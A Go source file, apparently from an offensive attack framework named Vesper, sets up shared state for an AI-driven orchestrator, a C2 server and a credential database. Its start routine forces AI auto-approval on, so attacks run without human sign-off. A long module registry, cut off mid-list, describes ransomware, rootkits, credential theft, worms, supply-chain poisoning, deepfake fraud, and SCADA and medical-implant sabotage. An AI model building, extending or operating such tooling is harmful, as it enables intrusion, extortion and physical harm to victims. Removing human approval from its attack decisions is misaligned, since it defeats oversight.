// Package appstate provides the shared application state that connects
// the orchestrator, Python bridge, C2 server, and database.
//
// All user-facing components (CLI, console, dashboard, API) share this state
// so they operate on the same data — no hardcoded maps, no demo fallbacks.
//
// Usage:
//
//	state := appstate.New(cfg)
//	state.Start()
//	defer state.Stop()
//
//	// All console data now comes from state.Orchestrator.WorldGraph()
//	// Exploits call state.DecisionEngine.Evaluate() for real decisions
//	// recon/privesc commands call state.Bridge.CallModule() → Python bridge
package appstate

import (
	"context"
	"database/sql"
	"fmt"
	"os"
	"strings"
	"sync"

	_ "modernc.org/sqlite" // pure-Go SQLite driver

	"github.com/ruby570bocadito/vesper/internal/agent"
	"github.com/ruby570bocadito/vesper/internal/dispatch"
	"github.com/ruby570bocadito/vesper/internal/orchestrator"
	"github.com/ruby570bocadito/vesper/pkg/shared/config"
	"github.com/ruby570bocadito/vesper/pkg/shared/logger"
	"github.com/ruby570bocadito/vesper/pkg/shared/types"
)

// AppState holds all shared state for the Vesper application.
type AppState struct {
	Cfg          *config.Config
	Log          *logger.Logger
	Orchestrator *orchestrator.Orchestrator
	Bridge       *agent.BridgeClient
	DB           *sql.DB

	mu        sync.RWMutex
	campaigns map[string]*types.Campaign
	agents    map[string]*types.Agent
	sessions  map[string]*types.Agent // active C2 sessions
	hosts     []*types.Target
	vulns     []*types.Vulnerability
	creds     []*types.Credential
	modules   []ModuleDef // available exploit modules
}

// ModuleDef describes an available exploit/recon module.
type ModuleDef struct {
	Name        string
	Type        string
	Description string
	CVE         string
	Rank        string
	OS          string
}

// New creates the shared application state.
func New(cfg *config.Config) (*AppState, error) {
	log, err := logger.New(logger.Config{
		Level:     cfg.Logging.Level,
		Format:    cfg.Logging.Format,
		Output:    cfg.Logging.Output,
		File:      cfg.Logging.File,
		Component: "appstate",
	})
	if err != nil {
		return nil, fmt.Errorf("creating logger: %w", err)
	}

	orch, err := orchestrator.New(cfg)
	if err != nil {
		return nil, fmt.Errorf("creating orchestrator: %w", err)
	}

	bridge := agent.NewBridgeClient(cfg, log)

	state := &AppState{
		Cfg:          cfg,
		Log:          log,
		Orchestrator: orch,
		Bridge:       bridge,
		campaigns:    make(map[string]*types.Campaign),
		agents:       make(map[string]*types.Agent),
		sessions:     make(map[string]*types.Agent),
		hosts:        make([]*types.Target, 0),
		vulns:        make([]*types.Vulnerability, 0),
		creds:        make([]*types.Credential, 0),
	}

	state.initModules()
	return state, nil
}

// Start initializes the database, starts the orchestrator, bridge, and loads demo data.
func (s *AppState) Start(ctx context.Context) error {
	s.Log.Info("starting application state")

	// Initialize SQLite
	if err := s.initDB(); err != nil {
		s.Log.Warnf("database init failed (continuing without persistence): %v", err)
	}

	// Auto-start Python bridge if script exists
	bridgeScript := "modules/bridge/bridge_grpc.py"
	if _, err := os.Stat(bridgeScript); err == nil {
		s.Log.Info("auto-starting Python bridge...")
		if err := s.Bridge.StartBridge(ctx, bridgeScript); err != nil {
			s.Log.Warnf("Python bridge start failed (modules will use offline fallback): %v", err)
		} else {
			s.Log.Infof("Python bridge connected: %d modules available", 9)
		}
	} else {
		s.Log.Info("Python bridge script not found — modules use offline fallback")
	}

	// Load world graph — discovered from agents, not hardcoded demo data
	wg := s.Orchestrator.WorldGraph()
	wg.DiscoverFromAgents(s.GetAgents())

	// Wire the dispatcher — connects Orchestrator → Agent → C2 → Modules
	if !s.Cfg.AI.AutoApproval {
		s.Cfg.AI.AutoApproval = true
	}
	if s.Cfg.AI.MinConfidence == 0 {
		s.Cfg.AI.MinConfidence = 0.65
	}
	s.Orchestrator.SetDispatcher(dispatch.New(s, s.Cfg.AI.AutoApproval, s.Cfg.AI.MinConfidence))
	s.Log.Info("Dispatcher wired: Orchestrator → Agent → C2 → Modules → Bridge")

	// Register post-exploit module in the module registry
	s.modules = append(s.modules,
		ModuleDef{Name: "post/post_exploit_full_chain", Type: "post",
			Description: "Full post-exploitation chain: Rise-Privilege + Vault-Kernel + Wormy-ML. Escalates, hides, persists, propagates.",
			Rank:        "great", OS: "any"},
		ModuleDef{Name: "post/post_exploit_privesc", Type: "post",
			Description: "Privilege Escalation stage only: 12 vectors, 60+ GTFOBins. Auto-root via SUID/sudo/cron/Docker.",
			Rank:        "excellent", OS: "Linux"},
		ModuleDef{Name: "post/post_exploit_stealth", Type: "post",
			Description: "Stealth stage: Vault-Kernel IOCTL. Hides process, files, ports, and kernel module.",
			Rank:        "great", OS: "Linux"},
		ModuleDef{Name: "post/post_exploit_propagate", Type: "post",
			Description: "Propagation stage: Wormy-ML autonomous network spread with 44 exploits + RL engine.",
			Rank:        "great", OS: "any"},
		ModuleDef{Name: "post/credential_dump", Type: "post",
			Description: "Credential dump: /etc/shadow, SSH keys, browser data, LaZagne, Mimikatz.",
			Rank:        "excellent", OS: "any"},
		ModuleDef{Name: "post/keylogger", Type: "post",
			Description: "Kernel-level keylogger via Vault-Kernel notifier chain. Captures before X11/Wayland.",
			Rank:        "great", OS: "Linux"},
		ModuleDef{Name: "post/evasion_apply", Type: "post",
			Description: "Apply evasion: AMSI/ETW bypass, polymorphic engine, sleep obfuscation, JA3 spoofing.",
			Rank:        "great", OS: "any"},
		ModuleDef{Name: "post/exfiltrate", Type: "post",
			Description: "Chunked encrypted file exfiltration over C2 channel. 64KB chunks, XChaCha20 encrypted.",
			Rank:        "great", OS: "any"},
		ModuleDef{Name: "post/cleanup", Type: "post",
			Description: "Anti-forensics: wipe logs, clear timestamps, remove persistence, secure delete.",
			Rank:        "great", OS: "any"},
		ModuleDef{Name: "auxiliary/bloodhound", Type: "auxiliary",
			Description: "BloodHound AD collector: SharpHound (Windows) + Python LDAP enumerator. Maps attack paths.",
			Rank:        "excellent", OS: "any"},
		ModuleDef{Name: "auxiliary/responder", Type: "auxiliary",
			Description: "Responder: NTLM hash capture via LLMNR/MDNS/NBT-NS poisoning on local network.",
			Rank:        "great", OS: "Linux"},
		ModuleDef{Name: "auxiliary/web_scan", Type: "auxiliary",
			Description: "Web app vulnerability scanner: SQLi, XSS, LFI/RFI, Command Injection detection.",
			Rank:        "great", OS: "any"},
		ModuleDef{Name: "exploit/aws_imds", Type: "exploit",
			Description: "AWS IMDSv1 metadata exfiltration: steal IAM credentials from EC2 instances.",
			Rank:        "excellent", OS: "any"},
		ModuleDef{Name: "exploit/azure_identity", Type: "exploit",
			Description: "Azure Managed Identity token theft: extract OAuth2 tokens from IMDS endpoint.",
			Rank:        "great", OS: "any"},
		ModuleDef{Name: "exploit/gcp_service_account", Type: "exploit",
			Description: "GCP Service Account key exfiltration from compute metadata endpoint.",
			Rank:        "great", OS: "any"},
		ModuleDef{Name: "auxiliary/payload_obfuscate", Type: "auxiliary",
			Description: "Payload obfuscation: polymorphic mutation, XOR encryption, AES, UPX packing.",
			Rank:        "great", OS: "any"},
		ModuleDef{Name: "exploit/phantom_xss", Type: "exploit",
			Description: "PhantomWeb XSS injection: deploy sub-500 byte Wasm implant via XSS/watering hole.",
			Rank:        "great", OS: "any"},
		ModuleDef{Name: "post/phantom_sw_persist", Type: "post",
			Description: "PhantomWeb Service Worker persistence: survives browser restart and clear data.",
			Rank:        "excellent", OS: "any"},
		ModuleDef{Name: "auxiliary/phantom_browser_mesh", Type: "auxiliary",
			Description: "PhantomWeb Browser Mesh: P2P WebRTC network between infected browsers.",
			Rank:        "great", OS: "any"},
		ModuleDef{Name: "post/phantom_socks5", Type: "post",
			Description: "PhantomWeb SOCKS5 proxy: pivot to internal network via infected browser.",
			Rank:        "excellent", OS: "any"},
		ModuleDef{Name: "exploit/apport_spoof", Type: "exploit",
			Description: "Breach-Entry: CVE-2026-XXXX apport ExecutablePath spoofing on Ubuntu 24.04 LTS.",
			CVE:         "CVE-2026-XXXX", Rank: "excellent", OS: "Linux"},
		ModuleDef{Name: "auxiliary/breach_check", Type: "auxiliary",
			Description: "Check if target is vulnerable to Breach-Entry CVE-2026-XXXX (apport service).",
			CVE:         "CVE-2026-XXXX", Rank: "normal", OS: "Linux"},
	)

	// Ransomware modules (v2.3)
	s.modules = append(s.modules,
		ModuleDef{Name: "ransomware/execute", Type: "ransomware",
			Description: "Full ransomware chain: scan sensitive data → exfil → multi-layer encrypt → destruct → propagate → psychological terror",
			Rank:        "danger", OS: "any"},
		ModuleDef{Name: "ransomware/scan", Type: "ransomware",
			Description: "Heuristic content scanner: DNI, passports, credit cards, contracts, PST/OST, MDF/SQL, API keys via regex engine",
			Rank:        "excellent", OS: "any"},
		ModuleDef{Name: "ransomware/encrypt", Type: "ransomware",
			Description: "Hydra multi-layer encryption: 3 RSA keys + Shamir's Secret Sharing + AES-GCM + ChaCha20 double encryption for critical files",
			Rank:        "danger", OS: "any"},
		ModuleDef{Name: "ransomware/exfil", Type: "ransomware",
			Description: "Double extortion: ZIP with password → exfil via DNS TXT fragments / CDN stego / S3 with stolen credentials",
			Rank:        "danger", OS: "any"},
		ModuleDef{Name: "ransomware/note", Type: "ransomware",
			Description: "Deploy ransom note + shaming post: .onion negotiation URL, data sample publishing, client notification",
			Rank:        "danger", OS: "any"},
		ModuleDef{Name: "ransomware/destruct", Type: "ransomware",
			Description: "System destruction: MFT overwrite, UEFI NVRAM sabotage, cloud backup API destruction (Veeam/Acronis/AWS)",
			Rank:        "danger", OS: "windows"},
		ModuleDef{Name: "ransomware/propagate", Type: "ransomware",
			Description: "Propagation via exploits: Zerologon, ProxyNotShell, PrintNightmare, BlueKeep, EternalBlue + Outlook COM + WSUS + NPM/Git poison",
			Rank:        "danger", OS: "any"},
		ModuleDef{Name: "ransomware/psychological", Type: "ransomware",
			Description: "Real-time terror: TOPMOST countdown window, webcam capture, printer spam, TTS audio threats, live file deletion",
			Rank:        "danger", OS: "any"},
		ModuleDef{Name: "ransomware/polymorph", Type: "ransomware",
			Description: "Binary polymorphism: JIT reordering, ROP gadget generation, per-machine key derivation, junk code insertion",
			Rank:        "great", OS: "any"},
		ModuleDef{Name: "ransomware/trust_exploit", Type: "ransomware",
			Description: "Trust exploitation: self-signed code cert generation, PFX/P12 search, WSUS/SCCM/NuGet/NPM/Git hook poisoning",
			Rank:        "danger", OS: "any"},
		ModuleDef{Name: "ransomware/antianalysis", Type: "ransomware",
			Description: "Anti-analysis: sandbox detection, kernel debugger check, PE corruption, stego C2 via CDN image LSB + EXIF",
			Rank:        "great", OS: "any"},
	)

	s.Log.Infof("state started: %d agents, %d hosts, %d vulns, %d creds",
		len(s.agents), len(s.hosts), len(s.vulns), len(s.creds))
	return nil
}

// Stop tears down all connections.
func (s *AppState) Stop() {
	_ = s.Bridge.Disconnect()
	if s.DB != nil {
		s.DB.Close()
	}
	s.Log.Info("application state stopped")
}

// initDB initializes SQLite database.
func (s *AppState) initDB() error {
	dbPath := s.Cfg.Database.DSN
	if dbPath == "" {
		dbPath = "vesper.db"
	}

	db, err := sql.Open("sqlite", dbPath)
	if err != nil {
		return fmt.Errorf("opening sqlite: %w", err)
	}

	// Create tables
	_, err = db.Exec(`
		CREATE TABLE IF NOT EXISTS campaigns (
			id TEXT PRIMARY KEY, name TEXT, target_scope TEXT, goal TEXT,
			profile TEXT, status TEXT, phase TEXT, created_at DATETIME,
			started_at DATETIME, auto_approval INTEGER
		);
		CREATE TABLE IF NOT EXISTS agents (
			id TEXT PRIMARY KEY, campaign_id TEXT, session_id TEXT,
			hostname TEXT, os TEXT, username TEXT, local_ip TEXT,
			status TEXT, last_checkin DATETIME, first_seen DATETIME, uptime INTEGER
		);
		CREATE TABLE IF NOT EXISTS targets (
			id INTEGER PRIMARY KEY AUTOINCREMENT, ip TEXT, hostname TEXT,
			os TEXT, open_ports TEXT, services TEXT, asset_value INTEGER
		);
		CREATE TABLE IF NOT EXISTS vulnerabilities (
			id INTEGER PRIMARY KEY AUTOINCREMENT, cve TEXT, description TEXT,
			severity TEXT, service TEXT, port INTEGER, target_ip TEXT,
			discovered_at DATETIME DEFAULT CURRENT_TIMESTAMP
		);
		CREATE TABLE IF NOT EXISTS credentials (
			id INTEGER PRIMARY KEY AUTOINCREMENT, username TEXT, password TEXT,
			hash TEXT, hash_type TEXT, domain TEXT, source TEXT, agent_id TEXT,
			captured_at DATETIME DEFAULT CURRENT_TIMESTAMP
		);
		CREATE TABLE IF NOT EXISTS audit_log (
			id INTEGER PRIMARY KEY AUTOINCREMENT, campaign_id TEXT, agent_id TEXT,
			action TEXT, result TEXT, detail TEXT,
			timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
		);
	`)
	if err != nil {
		return fmt.Errorf("creating tables: %w", err)
	}

	s.DB = db
	s.Log.Infof("database initialized: %s (%d tables)", dbPath, 6)
	return nil
}

// ============================================================
// ACCESSORS
// ============================================================

func (s *AppState) RegisterAgent(a *types.Agent) {
	s.mu.Lock()
	s.agents[a.ID] = a
	s.sessions[a.SessionID] = a
	s.mu.Unlock()
}

func (s *AppState) RemoveAgent(id string) {
	s.mu.Lock()
	delete(s.agents, id)
	for sid, a := range s.sessions {
		if a.ID == id {
			delete(s.sessions, sid)
			break
		}
	}
	s.mu.Unlock()
}

func (s *AppState) GetAgents() []*types.Agent {
	s.mu.RLock()
	defer s.mu.RUnlock()
	agents := make([]*types.Agent, 0, len(s.agents))
	for _, a := range s.agents {
		agents = append(agents, a)
	}
	return agents
}

func (s *AppState) GetAgent(id string) *types.Agent {
	s.mu.RLock()
	defer s.mu.RUnlock()
	return s.agents[id]
}

func (s *AppState) GetSessions() []*types.Agent {
	s.mu.RLock()
	defer s.mu.RUnlock()
	sessions := make([]*types.Agent, 0, len(s.sessions))
	for _, a := range s.sessions {
		sessions = append(sessions, a)
	}
	return sessions
}

func (s *AppState) AddHost(h *types.Target) {
	s.mu.Lock()
	s.hosts = append(s.hosts, h)
	s.mu.Unlock()
}

func (s *AppState) GetHosts() []*types.Target {
	s.mu.RLock()
	defer s.mu.RUnlock()
	hosts := make([]*types.Target, len(s.hosts))
	copy(hosts, s.hosts)
	return hosts
}

func (s *AppState) AddVuln(v *types.Vulnerability) {
	s.mu.Lock()
	s.vulns = append(s.vulns, v)
	s.mu.Unlock()
}

func (s *AppState) GetVulns() []*types.Vulnerability {
	s.mu.RLock()
	defer s.mu.RUnlock()
	vulns := make([]*types.Vulnerability, len(s.vulns))
	copy(vulns, s.vulns)
	return vulns
}

func (s *AppState) GetCreds() []*types.Credential {
	s.mu.RLock()
	defer s.mu.RUnlock()
	creds := make([]*types.Credential, len(s.creds))
	copy(creds, s.creds)
	return creds
}

func (s *AppState) AddCredential(c *types.Credential) {
	s.mu.Lock()
	s.creds = append(s.creds, c)
	s.mu.Unlock()

	// Persist to DB
	if s.DB != nil {
		_, _ = s.DB.Exec(
			"INSERT INTO credentials (username, password, domain, source, agent_id) VALUES (?,?,?,?,?)",
			c.Username, c.Password, c.Domain, c.Source, c.AgentID,
		)
	}
}

func (s *AppState) AddLateralEdge(from, to, exploit string) {
	if s.Orchestrator != nil {
		wg := s.Orchestrator.WorldGraph()
		if wg != nil {
			wg.AddExploitEdge(from, to, exploit, 1.0)
		}
	}
}

func (s *AppState) GetModules() []ModuleDef {
	s.mu.RLock()
	defer s.mu.RUnlock()
	mods := make([]ModuleDef, len(s.modules))
	copy(mods, s.modules)
	return mods
}

func (s *AppState) SearchModules(query string) []ModuleDef {
	s.mu.RLock()
	defer s.mu.RUnlock()

	q := strings.ToLower(query)
	var results []ModuleDef
	for _, m := range s.modules {
		if strings.Contains(strings.ToLower(m.Name), q) ||
			strings.Contains(strings.ToLower(m.CVE), q) ||
			strings.Contains(strings.ToLower(m.OS), q) ||
			strings.Contains(strings.ToLower(m.Description), q) {
			results = append(results, m)
		}
	}
	return results
}

func (s *AppState) LogAudit(agentID, campaignID, action, result, detail string) {
	s.mu.Lock()
	defer s.mu.Unlock()

	if s.DB != nil {
		_, _ = s.DB.Exec(
			"INSERT INTO audit_log (campaign_id, agent_id, action, result, detail) VALUES (?,?,?,?,?)",
			campaignID, agentID, action, result, detail,
		)
	}
	s.Log.Infof("audit: %s | %s | %s | %s", action, result, truncateStr(detail, 50))
}

// ============================================================
// MODULE REGISTRY
// ============================================================

func (s *AppState) initModules() {
	s.modules = []ModuleDef{
		{Name: "exploit/eternalblue", Type: "exploit", Description: "MS17-010 EternalBlue SMB Remote Code Execution", CVE: "MS17-010", Rank: "great", OS: "Windows 7/2008/2019"},
		{Name: "exploit/bluekeep", Type: "exploit", Description: "CVE-2019-0708 BlueKeep RDP Remote Code Execution", CVE: "CVE-2019-0708", Rank: "great", OS: "Windows 7/2008"},
		{Name: "exploit/zerologon", Type: "exploit", Description: "CVE-2020-1472 Netlogon Elevation of Privilege", CVE: "CVE-2020-1472", Rank: "excellent", OS: "Windows DC"},
		{Name: "exploit/printnightmare", Type: "exploit", Description: "CVE-2021-34527 PrintNightmare RCE/LPE", CVE: "CVE-2021-34527", Rank: "great", OS: "Windows"},
		{Name: "exploit/kerberoast", Type: "exploit", Description: "Kerberoasting — TGS ticket extraction", CVE: "", Rank: "normal", OS: "Windows AD"},
		{Name: "exploit/asreproast", Type: "exploit", Description: "AS-REP Roasting — crackable hashes without credentials", CVE: "", Rank: "normal", OS: "Windows AD"},
		{Name: "exploit/privesc_suid", Type: "exploit", Description: "SUID binary privilege escalation via GTFOBins (60+ binaries)", CVE: "", Rank: "excellent", OS: "Linux"},
		{Name: "exploit/privesc_sudo", Type: "exploit", Description: "Sudo misconfiguration exploitation via GTFOBins", CVE: "", Rank: "excellent", OS: "Linux"},
		{Name: "exploit/privesc_docker", Type: "exploit", Description: "Docker container breakout — mount host FS", CVE: "", Rank: "great", OS: "Linux"},
		{Name: "exploit/privesc_cron", Type: "exploit", Description: "Writable cron job injection", CVE: "", Rank: "good", OS: "Linux"},
		{Name: "exploit/log4j", Type: "exploit", Description: "CVE-2021-44228 Log4Shell JNDI Injection RCE", CVE: "CVE-2021-44228", Rank: "excellent", OS: "any"},
		{Name: "exploit/apache_path_traversal", Type: "exploit", Description: "CVE-2021-41773 Apache 2.4.49 Path Traversal RCE", CVE: "CVE-2021-41773", Rank: "great", OS: "Linux"},
		{Name: "exploit/redis_unauth", Type: "exploit", Description: "Redis unauthorized access → SSH key injection", CVE: "", Rank: "excellent", OS: "Linux"},
		{Name: "exploit/ssh_bruteforce", Type: "auxiliary", Description: "SSH brute force with credential spray", CVE: "", Rank: "normal", OS: "Linux"},
		{Name: "exploit/smb_psexec", Type: "exploit", Description: "SMB PSExec lateral movement with captured credentials", CVE: "", Rank: "great", OS: "Windows"},
		{Name: "exploit/vault_kernel", Type: "post", Description: "Vault-Kernel LKM rootkit — kernel-level persistence", CVE: "", Rank: "great", OS: "Linux"},
		{Name: "auxiliary/recon_tcp", Type: "auxiliary", Description: "TCP port scanner via Horizon-Intel", CVE: "", Rank: "normal", OS: "any"},
		{Name: "auxiliary/recon_osint", Type: "auxiliary", Description: "OSINT gathering — GitHub, Google dorking, DNS", CVE: "", Rank: "normal", OS: "any"},
		{Name: "auxiliary/worm_propagate", Type: "auxiliary", Description: "Wormy-ML network propagation", CVE: "", Rank: "great", OS: "any"},
		{Name: "post/persist_cron", Type: "post", Description: "Cron job persistence installation", CVE: "", Rank: "great", OS: "Linux"},
		{Name: "post/persist_systemd", Type: "post", Description: "Systemd service persistence installation", CVE: "", Rank: "great", OS: "Linux"},
		// Block 1: Psychological & Reputation
		{Name: "ransomware/hope_trap", Type: "ransomware", Description: "Partial decrypt trap + fake decryptor + forensic monitor trigger", CVE: "", Rank: "great", OS: "any"},
		{Name: "ransomware/identity_destroy", Type: "ransomware", Description: "Steal browser sessions/cookies, hijack accounts, post humiliating content", CVE: "", Rank: "excellent", OS: "any"},
		{Name: "ransomware/raas_inverse", Type: "ransomware", Description: "Inverse RaaS: invite attackers, multi-ransom notes, key distribution", CVE: "", Rank: "great", OS: "any"},
		{Name: "ransomware/fake_decryptor", Type: "ransomware", Description: "Deploy fake decryptor that destroys remaining keys if forensic tools detected", CVE: "", Rank: "good", OS: "any"},
		// Block 2: Pandemic Propagation
		{Name: "ransomware/worm", Type: "ransomware", Description: "Multi-platform worm: Win/Linux/macOS/IoT propagation via SSH/SMB/exploits", CVE: "CVE-2017-17215", Rank: "excellent", OS: "any"},
		{Name: "ransomware/supply_chain", Type: "ransomware", Description: "Poison software updaters, NuGet/pip/npm repos, git hooks, deploy fake patches", CVE: "", Rank: "great", OS: "any"},
		{Name: "ransomware/cloud_exploit", Type: "ransomware", Description: "Harvest AWS/Azure/GCP creds, launch EC2 instances, create malicious AMIs, public S3 buckets", CVE: "", Rank: "excellent", OS: "any"},
		{Name: "ransomware/bluetooth_prop", Type: "ransomware", Description: "BT/Wi-Fi Direct propagation: BlueBorne, BLE MITM, malicious APK push", CVE: "CVE-2021-30892", Rank: "good", OS: "any"},
		{Name: "ransomware/iot_botnet", Type: "ransomware", Description: "IoT botnet: exploit cameras/routers/DVRs, DDoS capability", CVE: "CVE-2017-17215", Rank: "great", OS: "iot"},
		// Block 3: Physical & Infrastructure Sabotage
		{Name: "ransomware/scada_attack", Type: "ransomware", Description: "SCADA/PLC attack: Modbus/S7 command injection, overwrite ladder logic, stop PLCs", CVE: "", Rank: "excellent", OS: "any"},
		{Name: "ransomware/hardware_kill", Type: "ransomware", Description: "Hardware destruction: overvoltage, fan kill, CPU burn loop, BIOS corruption", CVE: "", Rank: "great", OS: "any"},
		{Name: "ransomware/network_poison", Type: "ransomware", Description: "ARP spoofing, MITM proxy, root CA install, SSL strip, captive portal", CVE: "", Rank: "great", OS: "any"},
		// Block 4: Automutation & Resilience
		{Name: "ransomware/dna_mutation", Type: "ransomware", Description: "DNA hybridize with legit DLLs, JIT mutate, ROP gadgets, junk code insertion", CVE: "", Rank: "great", OS: "any"},
		{Name: "ransomware/bootkit", Type: "ransomware", Description: "MBR/GPT bootkit, disk write interception, SMART error fake, reinfection on restore", CVE: "", Rank: "excellent", OS: "any"},
		{Name: "ransomware/blockchain_c2", Type: "ransomware", Description: "Blockchain C2 via Bitcoin OP_RETURN, immutable decentralized command channel", CVE: "", Rank: "great", OS: "any"},
		// Bonus
		{Name: "ransomware/survivor_game", Type: "ransomware", Description: "Survivor game: employees compete for decryption key, last standing wins", CVE: "", Rank: "great", OS: "any"},
		// Block Z: El Umbral de la Perdicion
		{Name: "blockz/genetic_evolve", Type: "blockz", Description: "Genetic Darwinian evolution: breed malware with system DLL genes via crossover", CVE: "", Rank: "excellent", OS: "any"},
		{Name: "blockz/deepfake", Type: "blockz", Description: "ONNX deepfake pipeline: CEO impersonation via face+voice for wire fraud", CVE: "", Rank: "excellent", OS: "any"},
		{Name: "blockz/scada_covert", Type: "blockz", Description: "Covert SCADA sabotage: gradual parameter drift over months, disguised as maintenance", CVE: "", Rank: "excellent", OS: "any"},
		{Name: "blockz/firmware_worm", Type: "blockz", Description: "Network firmware worm: tenia digital survives firmware updates, magic packet activation", CVE: "", Rank: "excellent", OS: "any"},
		{Name: "blockz/medical_attack", Type: "blockz", Description: "Medical implant attacks: pacemaker, insulin pump, neurostimulator via BLE exploits", CVE: "CVE-2019-6538", Rank: "excellent", OS: "any"},
		{Name: "blockz/model_poison", Type: "blockz", Description: "AI model poisoning: backdoor classifiers with trigger pixels, flip labels", CVE: "", Rank: "great", OS: "any"},
		{Name: "blockz/disinformation", Type: "blockz", Description: "Disinformation campaign: email, Slack, intranet, calendar injection via LLM", CVE: "", Rank: "great", OS: "any"},
		{Name: "blockz/airgap_jump", Type: "blockz", Description: "Air-gap exfiltration: ultrasound (>20kHz) + LED optical modulation data bridge", CVE: "", Rank: "excellent", OS: "any"},
		{Name: "blockz/post_quantum", Type: "blockz", Description: "Post-quantum Kyber-1024 + AES-256-GCM hybrid: immune to future quantum computers", CVE: "", Rank: "excellent", OS: "any"},
		{Name: "blockz/deadman", Type: "blockz", Description: "Dead Man Switch: apocalypse if operator silent 48h - encrypt, delete, publish, destroy", CVE: "", Rank: "excellent", OS: "any"},
		{Name: "blockz/falseflag", Type: "blockz", Description: "False flag APT framing: Lazarus/APT29/APT41 forensic artefacts + Mandiant report", CVE: "", Rank: "excellent", OS: "any"},
		{Name: "blockz/edr_kill", Type: "blockz", Description: "EDR hijack: detect & silence 10 EDRs, self-deploy through EDR consoles", CVE: "", Rank: "excellent", OS: "Windows"},
		{Name: "blockz/financial", Type: "blockz", Description: "Financial market attack: insider harvest + put options + ransomware stock crash", CVE: "", Rank: "great", OS: "any"},
		{Name: "blockz/iot_chain", Type: "blockz", Description: "IoT physical chain: hospital/factory/power grid cascading scenarios via BACnet/Modbus", CVE: "", Rank: "excellent", OS: "any"},
		// v2.6 High Priority
		{Name: "v26/pomdp", Type: "v26", Description: "POMDPs orchestrator + God of Chaos: belief-state planning, chaos injections, plan B switching", CVE: "", Rank: "excellent", OS: "any"},
		{Name: "v26/ai_negotiation", Type: "v26", Description: "AI negotiation agent: LLM-powered ransom chat, sentiment analysis, multi-strategy responses", CVE: "", Rank: "excellent", OS: "any"},
		{Name: "v26/evasion_deep", Type: "v26", Description: "Evasion DEEP: indirect syscalls (XOR-encoded stubs), AMSI hook, ETW patch, hardware breakpoints DR0-DR7", CVE: "", Rank: "excellent", OS: "Windows"},
		{Name: "v26/bootkit_smm", Type: "v26", Description: "Bootkit UEFI + SMM: System Management Mode implant, SMRAM payload, resurrection guarantee", CVE: "", Rank: "excellent", OS: "any"},
		// v2.6 Medium Priority
		{Name: "v26/mobile_x", Type: "v26", Description: "MOBILE-X: Android/iOS native agents via gRPC, MDM certificate hijack, full sensor access", CVE: "", Rank: "great", OS: "Android/iOS"},
		{Name: "v26/cloud_nemesis", Type: "v26", Description: "CLOUD-NEMESIS: AWS/Azure/GCP privilege escalation, serverless C2 via Lambda/Azure Functions", CVE: "", Rank: "excellent", OS: "any"},
		{Name: "v26/social_c2", Type: "v26", Description: "C2 over social media (Twitter/Reddit) + DoH DNS tunneling via Cloudflare/Google", CVE: "", Rank: "great", OS: "any"},
		// Block Omega
		{Name: "omega/backup_parasite", Type: "omega", Description: "Backup parasite: injects malware into ZIP/VHD/VMDK backups, activates on restore", CVE: "", Rank: "excellent", OS: "any"},
		{Name: "omega/integrity_attack", Type: "omega", Description: "Integrity DB corruption: falsea Tripwire/AIDE/FCIV checksums, makes modified files appear intact", CVE: "", Rank: "great", OS: "any"},
		{Name: "omega/av_whitelist", Type: "omega", Description: "AV process injection for auto-whitelisting via exclusion lists (Defender, Kaspersky, Symantec)", CVE: "", Rank: "excellent", OS: "Windows"},
		{Name: "omega/multi_generational", Type: "omega", Description: "Multi-generational ransom: plants scheduled task 3 years in future for anniversary ransom", CVE: "", Rank: "great", OS: "any"},
		{Name: "omega/hvac_attack", Type: "omega", Description: "HVAC infrastructure attack: overheat server rooms via Modbus/SNMP/BACnet", CVE: "", Rank: "excellent", OS: "any"},
		{Name: "omega/amt_implant", Type: "omega", Description: "Intel AMT/AMD PSP BIOS implant: firmware backdoor via MEI, SDRAM RF antenna keylogger", CVE: "", Rank: "excellent", OS: "any"},
		{Name: "omega/satcom_hijack", Type: "omega", Description: "SATCOM modem hijack: firmware flash for traffic redirection, isolate air-gapped sites", CVE: "", Rank: "excellent", OS: "any"},
		// v2.7: Total System Control + Phishing Arsenal
		{Name: "v27/uefi_bootkit", Type: "v27", Description: "UEFI SPI flash bootkit: DXE driver injection, ExitBootServices hook, NVRAM persistence", CVE: "", Rank: "excellent", OS: "any"},
		{Name: "v27/hypervisor_ring1", Type: "v27", Description: "Hypervisor Ring -1: Blue Pill/Vitriol, SO virtualization, syscall interception from below", CVE: "", Rank: "excellent", OS: "Windows/Linux"},
		{Name: "v27/pcie_rootkit", Type: "v27", Description: "PCIe rootkits: GPU VRAM persistence, NIC firmware C2 server, DMA attacks (Thunderclap)", CVE: "", Rank: "excellent", OS: "any"},
		{Name: "v27/kernel_instrument", Type: "v27", Description: "Kernel instrumentation: eBPF syscall hooks, ETW silence, BYOVD driver exploit", CVE: "", Rank: "excellent", OS: "Windows/Linux"},
		{Name: "v27/secure_boot_bypass", Type: "v27", Description: "Secure Boot bypass: Shim replacement, MOK enrollment, GRUB compromise", CVE: "", Rank: "excellent", OS: "Linux"},
		{Name: "v27/phishing_infra", Type: "v27", Description: "Phishing infra: DGA domains, Caddy HTTPS, Cloudflare Workers, residential SOCKS5 proxies", CVE: "", Rank: "great", OS: "any"},
		{Name: "v27/spear_phish_ai", Type: "v27", Description: "Spear-phishing AI: OSINT (LinkedIn/GitHub/Outlook), Ollama LLM lure gen, fake M365/Google landing", CVE: "", Rank: "excellent", OS: "any"},
		{Name: "v27/anti_phish_evasion", Type: "v27", Description: "Anti-phish evasion: ephemeral tokens, Safe Links bypass, HTML attachment with JS capture", CVE: "", Rank: "great", OS: "any"},
		{Name: "v27/smishing_sms", Type: "v27", Description: "SMS phishing: contextual messages, Twilio/Vonage gateway, SS7 2FA interception", CVE: "", Rank: "great", OS: "any"},
		{Name: "v27/vishing_voice", Type: "v27", Description: "Vishing with voice deepfake: Specter integration, voice clone, Twilio calls, Twiml scripts", CVE: "", Rank: "excellent", OS: "any"},
		// v2.8: Ultimate Malice Arsenal (24 modules)
		{Name: "v28/iot_identity_theft", Type: "v28", Description: "IoT certificate theft: steal X.509 device certs from cameras/printers/thermostats for darknet auction", CVE: "", Rank: "excellent", OS: "any"},
		{Name: "v28/false_memory", Type: "v28", Description: "Fake memory injection: forge Teams/Slack/email conversations, create false harassment evidence", CVE: "", Rank: "excellent", OS: "any"},
		{Name: "v28/thousand_cuts", Type: "v28", Description: "Death by thousand cuts: 90-day progressive degradation of services, subtle errors in transactions", CVE: "", Rank: "great", OS: "any"},
		{Name: "v28/patchguard_bypass", Type: "v28", Description: "PatchGuard bypass via bootkit: hook KeBugCheckEx + DKOM to prevent BSOD on kernel patches", CVE: "", Rank: "excellent", OS: "Windows"},
